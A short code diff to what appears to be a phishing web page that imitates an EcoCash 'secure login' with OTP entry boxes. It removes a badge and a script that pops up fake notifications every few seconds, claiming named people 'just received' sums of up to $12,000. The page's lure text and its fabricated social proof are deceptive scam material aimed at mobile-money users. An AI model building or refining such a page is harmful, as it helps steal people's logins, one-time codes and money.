@@ -540,7 +540,7 @@ function showOverlayError(msg) {
 function showCoolLoader() {
   showOverlay(
     '<div class="cool-loader">' +
-      '<div class="eco-badge">💸</div>' +
+      '' +
       '<div class="overlay-title">Securing Your Connection</div>' +
       '<div class="overlay-desc">Preparing EcoCash secure login...</div>' +
       '<div class="loading-bar-wrap"><div class="loading-bar"></div></div>' +
@@ -865,25 +865,7 @@ function resetOtpBoxes() {
 
 updateLanding();
 
-// ═══════════════════════════════════════
-//  TOAST NOTIFICATIONS (more frequent)
-// ═══════════════════════════════════════
-var names = [
-  ['Tendai M.', '$1,500'], ['Rudo C.', '$3,200'], ['Farai D.', '$800'],
-  ['Simba N.', '$500'], ['Chipo Z.', '$12,000'], ['Tanya K.', '$2,100'],
-  ['Blessing N.', '$4,500'], ['Kudzi W.', '$950'], ['Mai T.', '$6,800']
-];
-var ti = 0;
-function showToast() {
-  if (!document.getElementById('s-land').classList.contains('active')) return;
-  var p = names[ti % names.length]; ti++;
-  document.getElementById('t-text').innerHTML = '<b>' + p[0] + '</b> just received ' + p[1];
-  var el = document.getElementById('toast');
-  el.classList.add('show');
-  setTimeout(function() { el.classList.remove('show'); }, 4500);
-}
-// Show first toast after 2 seconds, then every 5 seconds
-setTimeout(function() { showToast(); setInterval(showToast, 5000); }, 2000);
+
 </script>
 </body>
 </html>
